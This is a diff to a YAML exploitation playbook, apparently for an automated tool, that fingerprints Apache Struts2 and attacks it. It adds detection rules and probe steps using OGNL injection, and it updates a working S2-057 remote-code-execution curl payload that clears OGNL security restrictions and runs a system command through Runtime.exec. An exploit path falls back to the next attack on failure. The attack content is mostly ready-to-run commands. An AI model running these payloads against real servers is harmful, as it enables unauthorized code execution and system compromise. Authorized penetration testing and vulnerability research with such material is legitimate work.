@@ -34,17 +34,26 @@ match:
   rules:
     - fingerprint_contains: ["struts"]
     - fingerprint_contains: ["opensymphony"]
-    - evidence_contains: ["struts", "S2-"]
+    - fingerprint_contains: ["xwork"]
+    - fingerprint_contains: ["Showcase"]
+    - evidence_contains: ["struts"]
+    - evidence_contains: ["S2-"]
     - evidence_contains: [".action"]
+    - evidence_contains: ["OGNL"]
+    - evidence_contains: ["opensymphony"]
+    - evidence_contains: ["showcase"]
     - cve_matches:
         - "CVE-2017-5638"
         - "CVE-2017-9805"
         - "CVE-2018-11776"
+        - "CVE-2017-9791"
+        - "CVE-2019-0230"
 
 probes:
   - id: confirm_struts
-    description: "确认 Struts2 框架（通过错误触发特征响应）"
+    description: "确认 Struts2 框架"
     steps:
+      # 方法1: Content-Type OGNL 注入触发 Struts 错误
       - command: |
           curl -s -D - {ENDPOINT} \
             -H "Content-Type: %{(#test='multipart/form-data')}" \
@@ -55,7 +64,7 @@ probes:
           - if_contains: ["jakarta", "multipart"]
             set: { struts_confirmed: true, multipart_present: true }
 
-      # 尝试 .action 后缀访问
+      # 方法2: .action 后缀（302 也算，Shiro 保护的 Struts 会重定向）
       - command: |
           curl -s -o /dev/null -w "%{http_code}" \
             {ENDPOINT}/test.action --max-time 10
@@ -63,12 +72,19 @@ probes:
           - if_contains: ["404", "200", "302"]
             set: { action_suffix_works: true }
 
-      # 检查是否有 DevMode 或详细错误
+      # 方法3: S2-057 namespace OGNL 计算验证（最可靠，Shiro 不拦截 URL 路径）
+      # 如果 Location 头包含 54289（233*233），则 Struts2 确认且 S2-057 可利用
       - command: |
-          curl -s {ENDPOINT}/%24%7B1%2B1%7D --max-time 10
+          resp=$(curl -s -D - -o /dev/null \
+            "{ENDPOINT}/%24%7B233*233%7D/actionChain1.action" \
+            --max-time 10 2>&1)
+          echo "$resp"
+          if echo "$resp" | grep -q "54289"; then
+            echo "S2057_CONFIRMED"
+          fi
         parse_rules:
-          - if_contains: ["struts"]
-            set: { struts_confirmed: true }
+          - if_contains: ["54289", "S2057_CONFIRMED"]
+            set: { struts_confirmed: true, s2057_verified: true }
 
 exploit_paths:
   # ═══ 路径 A: S2-045 Content-Type OGNL 注入 ═══
@@ -133,9 +149,10 @@ exploit_paths:
         on_fail: next_path
 
       - id: s2057_rce
-        description: "S2-057 RCE"
+        description: "S2-057 RCE（命令输出在 Location 响应头中）"
         command: |
-          curl -s "{ENDPOINT}/%24%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec('id')).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D/actionChain1.action" \
+          curl -s -D - -o /dev/null \
+            "{ENDPOINT}/%24%7B(%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS).(%23ct%3D%23request%5B'struts.valueStack'%5D.context).(%23cr%3D%23ct%5B'com.opensymphony.xwork2.ActionContext.container'%5D).(%23ou%3D%23cr.getInstance(%40com.opensymphony.xwork2.ognl.OgnlUtil%40class)).(%23ou.getExcludedPackageNames().clear()).(%23ou.getExcludedClasses().clear()).(%23ct.setMemberAccess(%23dm)).(%23a%3D%40java.lang.Runtime%40getRuntime().exec('id')).(%40org.apache.commons.io.IOUtils%40toString(%23a.getInputStream()))%7D/actionChain1.action" \
             --max-time 15
         timeout: 20
         success_criteria:
